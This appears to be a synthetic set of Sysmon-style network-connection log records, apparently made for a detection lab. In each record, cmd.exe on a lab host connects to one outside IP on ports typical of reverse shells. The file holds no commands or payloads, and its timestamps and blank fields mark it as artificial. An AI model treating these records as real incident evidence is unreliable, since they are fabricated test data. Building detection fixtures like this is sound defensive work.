{"EventID": 3, "UtcTime": "2026-03-26 13:05:00.000", "ProcessId": 6140, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "", "CommandLine": "", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "185.220.101.33", "DestinationPort": 4444}
{"EventID": 3, "UtcTime": "2026-03-26 13:22:00.000", "ProcessId": 7031, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "", "CommandLine": "", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "185.220.101.33", "DestinationPort": 1234}
{"EventID": 3, "UtcTime": "2026-03-26 13:22:00.000", "ProcessId": 8528, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "", "CommandLine": "", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "185.220.101.33", "DestinationPort": 4444}
{"EventID": 3, "UtcTime": "2026-03-26 13:02:00.000", "ProcessId": 5154, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "", "CommandLine": "", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "185.220.101.33", "DestinationPort": 5555}
{"EventID": 3, "UtcTime": "2026-03-26 13:24:00.000", "ProcessId": 6347, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "", "CommandLine": "", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "185.220.101.33", "DestinationPort": 4444}
{"EventID": 3, "UtcTime": "2026-03-26 13:06:00.000", "ProcessId": 5998, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "", "CommandLine": "", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "185.220.101.33", "DestinationPort": 4444}
{"EventID": 3, "UtcTime": "2026-03-26 13:00:00.000", "ProcessId": 9997, "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "", "CommandLine": "", "User": "DESKTOP-LAB\\admin", "SourceIp": "10.0.1.50", "DestinationIp": "185.220.101.33", "DestinationPort": 5555}